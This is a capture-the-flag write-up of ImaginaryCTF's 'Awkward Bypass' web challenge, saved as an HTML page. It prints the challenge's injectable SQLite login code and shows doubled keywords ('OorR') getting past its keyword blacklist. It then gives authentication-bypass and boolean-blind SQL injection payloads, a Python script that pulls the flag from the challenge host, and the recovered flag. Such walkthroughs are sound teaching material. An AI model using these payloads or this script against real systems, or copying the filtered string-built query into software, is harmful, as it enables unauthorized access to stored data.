+<p>Visiting <code v-pre>https://awkward-bypass.chal.imaginaryctf.org/</code> shows this webpage,</p>
+<p><figure class="content-center">
+    <img src="../images/imaginaryctf/webpage.png" alt="webpage" />
+    <figcaption class="caption">webpage</figcaption>
+</figure>
+</p>
+<p>Seems like a standard webpage with nothing interesting, and viewing the source also is false hope as it has includes nothing out of the ordinary or of interest.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-markup"><code v-pre class="language-markup">&lt;!DOCTYPE HTML&gt; &lt;style&gt; input {
+  font-size: 28px;
+  margin-top: 20px;
+	}
+  h1 {
+    font-family: &quot;Trebuchet MS&quot;;
+  }
+	body {
+		background-color: #ADD8E6;
+	} &lt;/style&gt; &lt;center&gt; &lt;h1&gt;Login to get the flag 😉&lt;h1&gt; &lt;form action=&quot;[/user](view-source:https://awkward-bypass.chal.imaginaryctf.org/user)&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; placeholder=&quot;Username&quot; name=&quot;username&quot;&gt;&lt;/input&gt; &lt;br&gt; &lt;input type=&quot;text&quot; placeholder=&quot;Password&quot; name=&quot;password&quot;&gt;&lt;/input&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;&lt;/input&gt; &lt;/form&gt; &lt;/center&gt;</code></pre>
+</doc-codeblock></div>
+<p>Inputting wrong credentials, redirects us to <code v-pre>https://awkward-bypass.chal.imaginaryctf.org/user</code> with a response saying <code v-pre>Error</code></p>
+<p><figure class="content-center">
+    <img src="images/imginaryCTF/errorlogin.png" alt="errorpage" />
+    <figcaption class="caption">errorpage</figcaption>
+</figure>
+</p>
+<p>We can assume that when we feed in the correct credentials, it will not respond with that.</p>
+<p>Alright from all the information we&#x27;ve gathered, it seems that we either need to bypass the authentication to retrive the flag, or we need to utilize the behaviour of it returning <code v-pre>Error</code> depending on if a condition is met or not for Boolean SQLi.</p>
+<doc-anchor-target id="trying-to-bypass-the-blacklist">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#trying-to-bypass-the-blacklist">#</doc-anchor-trigger>
+        <span>Trying to bypass the blacklist</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="insecure-regex-match-and-replace">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#insecure-regex-match-and-replace">#</doc-anchor-trigger>
+        <span>Insecure regex match and replace</span>
+    </h3>
+</doc-anchor-target>
+<p>Going back to the extremely large blacklist put in place that we&#x27;ve discussed.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">blacklist = [&quot;ABORT&quot;, &quot;ACTION&quot;, &quot;ADD&quot;, &quot;AFTER&quot;, &quot;ALL&quot;, &quot;ALTER&quot;, &quot;ALWAYS&quot;, &quot;ANALYZE&quot;, &quot;AND&quot;, &quot;AS&quot;, &quot;ASC&quot;, &quot;ATTACH&quot;, &quot;AUTOINCREMENT&quot;, &quot;BEFORE&quot;, &quot;BEGIN&quot;, &quot;BETWEEN&quot;, &quot;CASC  
+ADE&quot;, &quot;CASE&quot;, &quot;CAST&quot;, &quot;CHECK&quot;, &quot;COLLATE&quot;, &quot;COLUMN&quot;, &quot;COMMIT&quot;, &quot;CONFLICT&quot;, &quot;CONSTRAINT&quot;, &quot;CREATE&quot;, &quot;CROSS&quot;, &quot;CURRENT&quot;, &quot;CURRENT_DATE&quot;, &quot;CURRENT_TIME&quot;, &quot;CURRENT_TIMESTAM  
+P&quot;, &quot;DATABASE&quot;, &quot;DEFAULT&quot;, &quot;DEFERRABLE&quot;, &quot;DEFERRED&quot;, &quot;DELETE&quot;, &quot;DESC&quot;, &quot;DETACH&quot;, &quot;DISTINCT&quot;, &quot;DO&quot;, &quot;DROP&quot;, &quot;EACH&quot;, &quot;ELSE&quot;, &quot;END&quot;, &quot;ESCAPE&quot;, &quot;EXCEPT&quot;, &quot;EXCLUDE&quot;, &quot;EXCLU  
+SIVE&quot;, &quot;EXISTS&quot;, &quot;EXPLAIN&quot;, &quot;FAIL&quot;, &quot;FILTER&quot;, &quot;FIRST&quot;, &quot;FOLLOWING&quot;, &quot;FOR&quot;, &quot;FOREIGN&quot;, &quot;FROM&quot;, &quot;FULL&quot;, &quot;GENERATED&quot;, &quot;GLOB&quot;, &quot;GROUP&quot;, &quot;GROUPS&quot;, &quot;HAVING&quot;, &quot;IF&quot;, &quot;IGNORE&quot;,  
+&quot;IMMEDIATE&quot;, &quot;IN&quot;, &quot;INDEX&quot;, &quot;INDEXED&quot;, &quot;INITIALLY&quot;, &quot;INNER&quot;, &quot;INSERT&quot;, &quot;INSTEAD&quot;, &quot;INTERSECT&quot;, &quot;INTO&quot;, &quot;IS&quot;, &quot;ISNULL&quot;, &quot;JOIN&quot;, &quot;KEY&quot;, &quot;LAST&quot;, &quot;LEFT&quot;, &quot;LIKE&quot;, &quot;LIMIT&quot;,  
+&quot;MATCH&quot;, &quot;MATERIALIZED&quot;, &quot;NATURAL&quot;, &quot;NO&quot;, &quot;NOT&quot;, &quot;NOTHING&quot;, &quot;NOTNULL&quot;, &quot;NULL&quot;, &quot;NULLS&quot;, &quot;OF&quot;, &quot;OFFSET&quot;, &quot;ON&quot;, &quot;OR&quot;, &quot;ORDER&quot;, &quot;OTHERS&quot;, &quot;OUTER&quot;, &quot;OVER&quot;, &quot;PARTITION&quot;, &quot;  
+PLAN&quot;, &quot;PRAGMA&quot;, &quot;PRECEDING&quot;, &quot;PRIMARY&quot;, &quot;QUERY&quot;, &quot;RAISE&quot;, &quot;RANGE&quot;, &quot;RECURSIVE&quot;, &quot;REFERENCES&quot;, &quot;REGEXP&quot;, &quot;REINDEX&quot;, &quot;RELEASE&quot;, &quot;RENAME&quot;, &quot;REPLACE&quot;, &quot;RESTRICT&quot;, &quot;RETURN  
+ING&quot;, &quot;RIGHT&quot;, &quot;ROLLBACK&quot;, &quot;ROW&quot;, &quot;ROWS&quot;, &quot;SAVEPOINT&quot;, &quot;SELECT&quot;, &quot;SET&quot;, &quot;TABLE&quot;, &quot;TEMP&quot;, &quot;TEMPORARY&quot;, &quot;THEN&quot;, &quot;TIES&quot;, &quot;TO&quot;, &quot;TRANSACTION&quot;, &quot;TRIGGER&quot;, &quot;UNBOUNDED&quot;, &quot;UNI  
+ON&quot;, &quot;UNIQUE&quot;, &quot;UPDATE&quot;, &quot;USING&quot;, &quot;VACUUM&quot;, &quot;VALUES&quot;, &quot;VIEW&quot;, &quot;VIRTUAL&quot;, &quot;WHEN&quot;, &quot;WHERE&quot;, &quot;WINDOW&quot;, &quot;WITH&quot;, &quot;WITHOUT&quot;]    
+  
+def checkCreds(username, password):  
+       con = sqlite3.connect('database.db')  
+       cur = con.cursor()  
+       for n in blacklist:  
+               regex = re.compile(n, re.IGNORECASE)  
+               username = regex.sub(&quot;&quot;, username)  
+       for n in blacklist:  
+               regex = re.compile(n, re.IGNORECASE)  
+               password = regex.sub(&quot;&quot;, password)  
+       print(f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;)  
+       try:  
+               content = cur.execute(f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;).fetchall()  
+       except:  
+               return False  
+       cur.close()  
+       con.close()  
+       if content == []:  
+               return False  
+       else:  
+               return True  </code></pre>
+</doc-codeblock></div>
+<p>The Regex match and replace is quite trivial to bypass, due to match and replace as a form of defense mechanism is already a bad idea, as sanitization should always be your first form of defense.</p>
+<p>The regex match and replace is equivelant to doing <code v-pre>str.replace()</code> using the built-in method <code v-pre>replace()</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">&gt;&gt;&gt; &quot;' OR 1=1&quot;.replace(&quot;OR&quot;,&quot;&quot;)   
+&quot;'  1=1&quot;  
+&gt;&gt;&gt; &quot;' OORR 1=1&quot;.replace(&quot;OR&quot;,&quot;&quot;)           
+&quot;' OR 1=1&quot;  
+&gt;&gt;&gt;</code></pre>
+</doc-codeblock></div>
+<p>As you can see, this was very easily circumventable, and the only difference with the regex match and replace and <code v-pre>.replace()</code> built-in method is that the regex match and replace isn&#x27;t case sensitive.</p>
+<p>We can test our filter/blacklist bypass with this simple python script</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">import re  
+  
+blacklist = [&quot;ABORT&quot;, &quot;ACTION&quot;, &quot;ADD&quot;, &quot;AFTER&quot;, &quot;ALL&quot;, &quot;ALTER&quot;, &quot;ALWAYS&quot;, &quot;ANALYZE&quot;, &quot;AND&quot;, &quot;AS&quot;, &quot;ASC&quot;, &quot;ATTACH&quot;, &quot;AUTOINCREMENT&quot;, &quot;BEFORE&quot;, &quot;BEGIN&quot;, &quot;BETWEEN&quot;, &quot;CASC  
+ADE&quot;, &quot;CASE&quot;, &quot;CAST&quot;, &quot;CHECK&quot;, &quot;COLLATE&quot;, &quot;COLUMN&quot;, &quot;COMMIT&quot;, &quot;CONFLICT&quot;, &quot;CONSTRAINT&quot;, &quot;CREATE&quot;, &quot;CROSS&quot;, &quot;CURRENT&quot;, &quot;CURRENT_DATE&quot;, &quot;CURRENT_TIME&quot;, &quot;CURRENT_TIMESTAM  
+P&quot;, &quot;DATABASE&quot;, &quot;DEFAULT&quot;, &quot;DEFERRABLE&quot;, &quot;DEFERRED&quot;, &quot;DELETE&quot;, &quot;DESC&quot;, &quot;DETACH&quot;, &quot;DISTINCT&quot;, &quot;DO&quot;, &quot;DROP&quot;, &quot;EACH&quot;, &quot;ELSE&quot;, &quot;END&quot;, &quot;ESCAPE&quot;, &quot;EXCEPT&quot;, &quot;EXCLUDE&quot;, &quot;EXCLU  
+SIVE&quot;, &quot;EXISTS&quot;, &quot;EXPLAIN&quot;, &quot;FAIL&quot;, &quot;FILTER&quot;, &quot;FIRST&quot;, &quot;FOLLOWING&quot;, &quot;FOR&quot;, &quot;FOREIGN&quot;, &quot;FROM&quot;, &quot;FULL&quot;, &quot;GENERATED&quot;, &quot;GLOB&quot;, &quot;GROUP&quot;, &quot;GROUPS&quot;, &quot;HAVING&quot;, &quot;IF&quot;, &quot;IGNORE&quot;,  
+&quot;IMMEDIATE&quot;, &quot;IN&quot;, &quot;INDEX&quot;, &quot;INDEXED&quot;, &quot;INITIALLY&quot;, &quot;INNER&quot;, &quot;INSERT&quot;, &quot;INSTEAD&quot;, &quot;INTERSECT&quot;, &quot;INTO&quot;, &quot;IS&quot;, &quot;ISNULL&quot;, &quot;JOIN&quot;, &quot;KEY&quot;, &quot;LAST&quot;, &quot;LEFT&quot;, &quot;LIKE&quot;, &quot;LIMIT&quot;,  
+&quot;MATCH&quot;, &quot;MATERIALIZED&quot;, &quot;NATURAL&quot;, &quot;NO&quot;, &quot;NOT&quot;, &quot;NOTHING&quot;, &quot;NOTNULL&quot;, &quot;NULL&quot;, &quot;NULLS&quot;, &quot;OF&quot;, &quot;OFFSET&quot;, &quot;ON&quot;, &quot;OR&quot;, &quot;ORDER&quot;, &quot;OTHERS&quot;, &quot;OUTER&quot;, &quot;OVER&quot;, &quot;PARTITION&quot;, &quot;  
+PLAN&quot;, &quot;PRAGMA&quot;, &quot;PRECEDING&quot;, &quot;PRIMARY&quot;, &quot;QUERY&quot;, &quot;RAISE&quot;, &quot;RANGE&quot;, &quot;RECURSIVE&quot;, &quot;REFERENCES&quot;, &quot;REGEXP&quot;, &quot;REINDEX&quot;, &quot;RELEASE&quot;, &quot;RENAME&quot;, &quot;REPLACE&quot;, &quot;RESTRICT&quot;, &quot;RETURN  
+ING&quot;, &quot;RIGHT&quot;, &quot;ROLLBACK&quot;, &quot;ROW&quot;, &quot;ROWS&quot;, &quot;SAVEPOINT&quot;, &quot;SELECT&quot;, &quot;SET&quot;, &quot;TABLE&quot;, &quot;TEMP&quot;, &quot;TEMPORARY&quot;, &quot;THEN&quot;, &quot;TIES&quot;, &quot;TO&quot;, &quot;TRANSACTION&quot;, &quot;TRIGGER&quot;, &quot;UNBOUNDED&quot;, &quot;UNI  
+ON&quot;, &quot;UNIQUE&quot;, &quot;UPDATE&quot;, &quot;USING&quot;, &quot;VACUUM&quot;, &quot;VALUES&quot;, &quot;VIEW&quot;, &quot;VIRTUAL&quot;, &quot;WHEN&quot;, &quot;WHERE&quot;, &quot;WINDOW&quot;, &quot;WITH&quot;, &quot;WITHOUT&quot;]    
+  
+username = input()  
+password = input()  
+  
+  
+for n in blacklist:  
+       regex = re.compile(n, re.IGNORECASE)  
+       username = regex.sub(&quot;&quot;, username)  
+for n in blacklist:  
+       regex = re.compile(n, re.IGNORECASE)  
+       password = regex.sub(&quot;&quot;, password)  
+  
+print(f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;)</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">utopia@messiah:~/Documents/CTFs/awkward_bypass$ python3 sql.py   
+' OR 1=1 -- -  &lt;-- Username field
+blabla  &lt;-- Password field
+SELECT * FROM users WHERE username=''  1=1 -- -' AND password='blabla' &lt;-- result of filtering</code></pre>
+</doc-codeblock></div>
+<p>Now let&#x27;s try to bypass it using the same principle of <code v-pre>str.replace()</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">utopia@messiah:~/Documents/CTFs/awkward_bypass$ python3 sql.py   
+' OorR 1=1 -- -  &lt;-- Username field
+blabla  &lt;-- Password field
+SELECT * FROM users WHERE username='' OR 1=1 -- -' AND password='blabla'  &lt;-- result of filtering</code></pre>
+</doc-codeblock></div>
+<p>We&#x27;ve now officially bypassed the blacklisting/filtering.</p>
+<doc-anchor-target id="sql-injection-1">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#sql-injection-1">#</doc-anchor-trigger>
+        <span>SQL Injection</span>
+    </h2>
+</doc-anchor-target>
+<doc-anchor-target id="testing-if-boolean-is-the-correct-way-to-go">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#testing-if-boolean-is-the-correct-way-to-go">#</doc-anchor-trigger>
+        <span>Testing if boolean is the correct way to go</span>
+    </h3>
+</doc-anchor-target>
+<p>We can bypass authenticated pretty easily with the payload <code v-pre>' OorR 1=1; -- -</code>, this is pretty standard and basic.</p>
+<p><figure class="content-center">
+    <img src="images/imginaryCTF/injected.png" alt="injected" />
+    <figcaption class="caption">injected</figcaption>
+</figure>
+</p>
+<p>It works! Except... we don&#x27;t have the flag, <strong>yet</strong>. We now have to enumerate the table name column <code v-pre>password</code> which contains the flag using boolean SQLi.</p>
+<doc-anchor-target id="exploiting-boolean-sqli-to-retrive-flag-from-db">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#exploiting-boolean-sqli-to-retrive-flag-from-db">#</doc-anchor-trigger>
+        <span>Exploiting boolean SQLi to retrive flag from DB</span>
+    </h3>
+</doc-anchor-target>
+<p>We can also verify quickly verify for boolean SQLi with the payload <code v-pre>' OorR 3&gt;1; -- -</code>, if the condition evalutes to True, we&#x27;ll get a <code v-pre>Ummmmmmm, did you expect a flag to be here?</code> page, if not, we&#x27;ll get <code v-pre>Error</code>.</p>
+<p>Equipped with this information and also a filter bypass, we can now with ease enumerate the database with this payload</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">`' OorR 1=1 AandND (SEselectLECT hex(substr(paASsswoORrd,1,1)) FRfromOM sqlite_maASster WHwhereERE type='tatableble' AandND tbl_name NnnoOTOT LIlikeKE 'sqlite_%' LIlimitMIT 1 OofFFSsetET 0) &gt; hex('A'); -- -`</code></pre>
+</doc-codeblock></div>
+<p>or without all the filter bypass mess,</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">' OR 1=1 AND (SELECT hex(substr(password,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE  'sqlite_%' LIMIT 1 OFFSET 0) &gt; hex('A'); -- -</code></pre>
+</doc-codeblock></div>
+<p>Now, the payload does not make much sense without any information on how it works, basically, if we execute this into our makeshift SQLite database, it&#x27;ll make more sense.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-none"><code v-pre class="language-none">sqlite&gt; SELECT * FROM users WHERE username='' OR 1=1 AND (SELECT hex(substr(password,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE  'sqlite_%' LIMIT 1 OFFSET 0) &gt; hex('A'); -- -' AND password=''  
+administrator|password123  
+john.william|password  
+sqlite&gt; SELECT * FROM users WHERE username='' OR 1=1 AND (SELECT hex(substr(password,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('z');           
+sqlite&gt;</code></pre>
+</doc-codeblock></div>
+<p>This is the part of the post where I&#x27;ve really struggled to explain how this payload works, and why it works, so I&#x27;m going to break it into parts.</p>
+<p>The important comparison being <code v-pre>AND (SELECT hex(substr(password,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) &gt; hex('z');</code>, in <code v-pre>substr(password,1,1)</code>, we select the first character of the first row of the <code v-pre>username</code> column, and with <code v-pre>hex(substr(password,1,1))</code> we retrive the hexidecimal representation of the said first character, we then compare it to the hexidecimal representation of the character <code v-pre>z</code>, and if the quantity of the hex representation of the first character of the password is higher than the injected one, it&#x27;ll evaluate to True, so if you cycle through the hexidecimal representation of ASCII characters starting from <code v-pre>0</code> to <code v-pre>127</code> sequentially , and once we hit a certain character which will trigger an evalation to be False, we know that is correct character, and we increment the character index from  <code v-pre>hex(substr(password,1,1))</code> to <code v-pre>hex(substr(password,2,1))</code> until we&#x27;ve obtained the full flag, this is quite a time consuming process if done manually, which is why scripting it is a good idea, which is what I&#x27;ve done.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
+import requests
+from time import sleep
+&quot;&quot;&quot;
+	Description: Boolean sqlite SQLi
+&quot;&quot;&quot;
+
+HOST = &quot;https://awkward-bypass.chal.imaginaryctf.org/user&quot;
+
+LENGTH = 1 
+FLAG = &quot;&quot;
+while True:
+	for number in range(21, 126):
+		# breaks the query, resulting in a 'Found' which is invalid, resetting it back to
+		
+		if bytes.fromhex(hex(number)[2:].zfill(2)) == b&quot;'&quot;:
+			number = 21
+		
+
+		# Assigned it to a variable for better readability
+		char = bytes.fromhex(hex(number)[2:].zfill(2)).decode(&quot;utf-8&quot;)
+		data = {&quot;username&quot;:&quot;' OorR 1=1 AandND (SEselectLECT hex(substr(paASsswoORrd,{1},1)) FRfromOM sqlite_maASster WHwhereERE type='tatableble' AandND tbl_name NnnoOTOT LIlikeKE  'sqlite_%' LIlimitMIT 1 OofFFSsetET 0) &gt; hex('{0}'); -- -&quot;.format(char,LENGTH),&quot;password&quot;:&quot;whatever&quot;}
+		req = requests.post(HOST, data=data)
+		
+		if req.text == &quot;Error&quot;:
+			FLAG += bytes.fromhex(hex(number)[2:].zfill(2)).decode(&quot;utf-8&quot;)
+			LENGTH += 1
+			print(&quot;It was number:&quot;,number)
+			print(f&quot;Found!: {FLAG}&quot;)
+			break
+		
+</code></pre>
+</doc-codeblock></div>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">utopia@messiah:~/Documents/CTFs/Build-A-Website$ python3 exploit.py   
+It was number: 105  
+Found!: i  
+It was number: 99  
+Found!: ic  
+It was number: 116  
+Found!: ict  
+It was number: 102  
+Found!: ictf  
+It was number: 123  
+Found!: ictf{  
+It was number: 110  
+Found!: ictf{n  
+It was number: 49  
+Found!: ictf{n1  
+It was number: 99  
+Found!: ictf{n1c  
+It was number: 51  
+Found!: ictf{n1c3  
+It was number: 95  
+Found!: ictf{n1c3_  
+It was number: 102  
+Found!: ictf{n1c3_f  
+It was number: 105  
+Found!: ictf{n1c3_fi  
+It was number: 108  
+Found!: ictf{n1c3_fil  
+It was number: 55  
+Found!: ictf{n1c3_fil7  
+It was number: 51  
+Found!: ictf{n1c3_fil73  
+It was number: 114  
+Found!: ictf{n1c3_fil73r  
+It was number: 95  
+Found!: ictf{n1c3_fil73r_  
+It was number: 98  
+Found!: ictf{n1c3_fil73r_b  
+It was number: 121  
+Found!: ictf{n1c3_fil73r_by  
+It was number: 112  
+Found!: ictf{n1c3_fil73r_byp  
+It was number: 64  
+Found!: ictf{n1c3_fil73r_byp@  
+It was number: 115  
+Found!: ictf{n1c3_fil73r_byp@s  
+It was number: 115  
+Found!: ictf{n1c3_fil73r_byp@ss  
+It was number: 95  
+Found!: ictf{n1c3_fil73r_byp@ss_  
+It was number: 55  
+Found!: ictf{n1c3_fil73r_byp@ss_7  
+It was number: 49  
+Found!: ictf{n1c3_fil73r_byp@ss_71  
+It was number: 51  
+Found!: ictf{n1c3_fil73r_byp@ss_713  
+It was number: 48  
+Found!: ictf{n1c3_fil73r_byp@ss_7130  
+It was number: 54  
+Found!: ictf{n1c3_fil73r_byp@ss_71306  
+It was number: 55  
+Found!: ictf{n1c3_fil73r_byp@ss_713067  
+It was number: 54  
+Found!: ictf{n1c3_fil73r_byp@ss_7130676  
+It was number: 100  
+Found!: ictf{n1c3_fil73r_byp@ss_7130676d  
+It was number: 125  
+Found!: ictf{n1c3_fil73r_byp@ss_7130676d}</code></pre>
+</doc-codeblock></div>
+<p>And, we&#x27;ve obtained the flag <code v-pre>ictf{n1c3_fil73r_byp@ss_7130676d}</code></p>
+<p>Quite fun and easy challenge, I like making writeups on challenges that aren&#x27;t too hard and understandable. As higher difficulty equates to more explaining, and I&#x27;m not a native speaker so I&#x27;ll have some trouble explaining some concepts or attacks fluentlty. Nonetheless, hope you enjoyed and learned a thing or two.</p>
+
+
+
+
+                <!-- Required only on API pages -->
+                <doc-toolbar-member-filter-no-results />
+            </div>
+
+            
+<nav class="flex mt-14">
+    <div class="w-1/2">
+        <a class="px-5 py-4 h-full flex items-center break-all md:break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r rounded-l-lg transition-colors duration-150 relative hover:z-5" href="/about/">
+            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+            <span>
+                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
+                <span class="block mt-1">About</span>
+            </span>
+        </a>
+    </div>
+
+    <div class="w-1/2">
+    </div>
+</nav>
+
+
+        </main>
+
+        <div class="border-t dark:border-dark-650 pt-6 mb-8">
+            <footer class="flex flex-wrap items-center justify-between">
+    <div>
+        <ul class="flex flex-wrap items-center text-sm">
+</ul>
+
+    </div>
+    <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"></div>
+</footer>
+
+        </div>
+    </div>
+    
+    <!-- Rendered if sidebar right is enabled -->
+    <!-- Sidebar right skeleton-->
+    <div v-cloak class="fixed top-0 bottom-0 right-0 transform translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:flex-shrink-0 lg:pt-6 lg:transform-none lg:w-56 lg:z-0 md:w-72 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+        <div class="pl-5">
+            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+        </div>
+    </div>
+    
+    <!-- User should be able to hide sidebar right -->
+    <doc-sidebar-right v-cloak></doc-sidebar-right>
+</div>
+
+        </div>
+    </div>
+
+    <doc-search-mobile></doc-search-mobile>
+    <doc-back-to-top></doc-back-to-top>
+</div>
+
+
+        <div id="docs-overlay-target"></div>
+
+        <script>window.__DOCS__ = { "title": "ImginaryCTF - Awkward_Bypass Writeup", icon: "file", hasPrism: true, hasMermaid: false }</script>
+    </body>
+</html>
